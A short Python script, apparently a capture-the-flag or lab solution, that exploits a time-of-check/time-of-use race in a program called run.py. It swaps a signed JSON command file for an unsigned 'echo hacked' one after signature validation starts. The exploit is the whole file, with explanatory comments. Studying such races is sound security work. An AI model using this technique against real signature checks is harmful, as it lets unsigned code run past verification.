from subprocess import Popen
import json

def generate_valid_script():
	return json.dumps({"command": "echo cool", "signature": "6c68e3c88a87339fa8667cb36c82d4cf0bdcc131efcf98eb8df1867122e66e0e2e9d8d1ce01c40261fb8bde61a7768215c20febc2cd522af3a2232be73cabe3ada6d86b1635a52c787bd7d97985f4ce2ef9b47ea0c72bdb35b702f9169218adc2d4cd53eabfc3c875bef05270b703d407afb5b22198d56f3489ec8e3241c19a9"})

def generate_invalid_script():
	return json.dumps({"command" : "echo hacked"})


def main():
	# First, get a command with a valid signature.
	script = generate_valid_script()

	# Write it to a file and call run.py with it
	with open('foo', 'w') as writer:
		writer.write(script)
	run = Popen(['python', 'run.py', 'foo'])

	# The validation takes a couple of precious seconds.
	# In that time we get a new script that only holds a commnad.
	script = generate_invalid_script()

	# Next we overwrite the file we passed to run.py.
	with open('foo', 'w') as writer:
		writer.write(script)
		writer.truncate()
	# Because the execution method reopens the file to read it
	# it will open the new file we just wrote, the one with no signature.

	# Wait for success... any minute now...



if __name__ == '__main__':
	main()